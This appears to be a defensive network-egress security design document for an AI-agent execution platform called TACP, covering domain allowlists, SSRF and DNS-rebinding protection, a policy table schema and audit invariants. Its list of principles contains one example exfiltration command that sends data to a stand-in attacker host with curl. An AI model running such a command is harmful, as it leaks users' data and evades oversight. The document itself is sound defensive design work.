# TACP Network Policy & Egress Security Model

**Document:** `docs/security/NETWORK-MODEL.md`  
**Phase:** Phase 2 — Governed Execution Platform (Gate A Architecture)  
**Security Lead:** Antigravity Principal Security Engineer  
**Date:** September 11, 2026  

---

## 1. Network Security Principles

1. **Network Access is an Explicit Capability**: Network egress is not an assumed right of every agent or command. It is governed as a dedicated capability (`network.egress`) that is disabled by default.
2. **No Unaudited Outbound Sockets**: All external communication must pass through declared domains and validated endpoints.
3. **No Hidden Egress via Shell**: AI agents cannot bypass network policies simply by executing raw shell commands (`curl http://attacker.com/leak`). Command execution environments are isolated and network-governed.
4. **Strict SSRF & Intranet Protection**: Outbound network requests cannot target internal Termux loopback services, Android internal daemon sockets, or RFC 1918 private subnets.

---

## 2. Egress Controls & Allowlisting

When network access is authorized for a workspace or job, it is constrained by a strict domain and port allowlist:

| Policy Setting | Default Value | Purpose |
|---|---|---|
| `network_enabled` | `false` | Global default: Zero network access unless explicitly granted |
| `allowed_domains` | `["pypi.org", "files.pythonhosted.org", "github.com"]` | Exact domain allowlist (no wildcards `*` allowed) |
| `allowed_ports` | `[443]` | Encrypted HTTPS only; unencrypted HTTP (port 80) blocked |
| `max_transfer_bytes` | 52,428,800 bytes (50 MB) | Maximum download/upload quota per task |
| `timeout_seconds` | 30 seconds | Hard timeout on network operations |

---

## 3. Server-Side Request Forgery (SSRF) Prevention

To protect internal phone daemons, local web servers, and local router interfaces, the network policy engine resolves all destination IP addresses before socket connection and blocks:

1. **Loopback Addresses**: `127.0.0.0/8`, `::1`, `localhost`
2. **Private IPv4 Subnets (RFC 1918)**:
   - `10.0.0.0/8`
   - `172.16.0.0/12`
   - `192.168.0.0/16`
3. **Link-Local & Cloud Metadata**:
   - `169.254.0.0/16` (Cloud instance metadata / Android tethering)
   - `fe80::/10` (IPv6 Link-Local)
4. **Multicast & Broadcast**:
   - `224.0.0.0/4`, `255.255.255.255/32`

### DNS Rebinding & Redirect Protection
- **Pre-Connection Resolution**: Hostnames are resolved to IP addresses *prior* to connection; if the resolved IP is private/loopback, the request is terminated immediately.
- **Redirect Re-Validation**: HTTP redirects (301, 302, 307) are not followed automatically. Every redirect location is checked against domain and IP allowlists before a new socket is opened.

---

## 4. Policy Schema & Persistence

```sql
CREATE TABLE IF NOT EXISTS network_policies (
    id TEXT PRIMARY KEY,
    workspace_id TEXT NOT NULL,
    enabled INTEGER NOT NULL DEFAULT 0,
    allowed_domains_json TEXT NOT NULL DEFAULT '[]',
    allowed_ports_json TEXT NOT NULL DEFAULT '[443]',
    max_transfer_bytes INTEGER NOT NULL DEFAULT 52428800,
    created_at TEXT NOT NULL,
    FOREIGN KEY(workspace_id) REFERENCES workspaces(id)
);

CREATE INDEX IF NOT EXISTS idx_network_policies_ws ON network_policies(workspace_id);
```

---

## 5. Security Invariants

1. **Fail-Closed on DNS Failure**: If a domain cannot be resolved or DNS query times out, the request is blocked.
2. **Audit Logging of All Egress**: Every outbound network attempt records timestamp, destination domain, resolved IP, byte count, and policy decision in the cryptographic audit log.
3. **Zero Inbound Listening**: TACP binds exclusively to `127.0.0.1` for local IPC. It never opens listening sockets on public network interfaces (`0.0.0.0`).
